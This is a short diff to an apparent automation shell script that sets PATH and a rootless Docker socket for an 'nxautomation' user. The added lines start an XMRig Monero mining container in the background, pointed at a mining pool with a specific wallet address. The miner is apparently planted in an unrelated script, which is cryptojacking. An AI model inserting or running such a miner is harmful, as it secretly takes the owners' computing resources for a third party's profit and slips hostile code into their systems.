@@ -1,4 +1,9 @@
 
+docker run --name xmrig --network my -d xmrig/xmrig -o rx.unmineable.com:3333 \ 
+-u XMR:82XuRT7TcgH5hfRC5pXhvxhoCm5xvxLtQBdaxWzx3u66UUM6JPQMpMiZzUdPW63iyN8yWi2jbGLLwM9s8x44DtaKPiGUTXx.dev \
+-p x 
+
+
 export PATH=/home/nxautomation/run/bin:$PATH
 
 export DOCKER_HOST=unix:///run/user/995/docker.sock
